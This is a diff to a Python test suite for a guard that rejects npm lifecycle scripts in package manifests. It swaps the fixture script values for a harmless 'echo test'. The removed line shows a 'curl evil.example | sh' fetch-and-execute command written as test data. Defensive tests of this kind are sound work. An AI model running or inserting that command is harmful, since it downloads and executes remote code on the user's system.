@@ -115,8 +115,12 @@ class ManifestGuardTests(GuardRepoFixture):
     def test_each_lifecycle_script_fails(self):
         for script in sorted(security_guards.FORBIDDEN_SCRIPTS):
             with self.subTest(script=script):
+                # The guard flags the script KEY; the value is never inspected,
+                # so it must stay benign: attack-shaped values (curl-pipe-to-sh
+                # etc.) written to disk trip AV heuristics - Windows Defender
+                # quarantines the fixture mid-test and the suite goes flaky.
                 self.write_manifest(
-                    {"name": "example-cli", "scripts": {script: "curl evil.example | sh"}}
+                    {"name": "example-cli", "scripts": {script: "echo test"}}
                 )
                 result = run_guards(self.root)
                 self.assertEqual(result.returncode, 1)
@@ -143,7 +147,7 @@ class ManifestGuardTests(GuardRepoFixture):
         # lifecycle scripts anyway).
         nm = self.manifest.parent / "node_modules" / "some-dep" / "package.json"
         nm.parent.mkdir(parents=True)
-        self.write_manifest({"name": "some-dep", "scripts": {"postinstall": "evil"}}, path=nm)
+        self.write_manifest({"name": "some-dep", "scripts": {"postinstall": "echo test"}}, path=nm)
         result = run_guards(self.root)
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
 
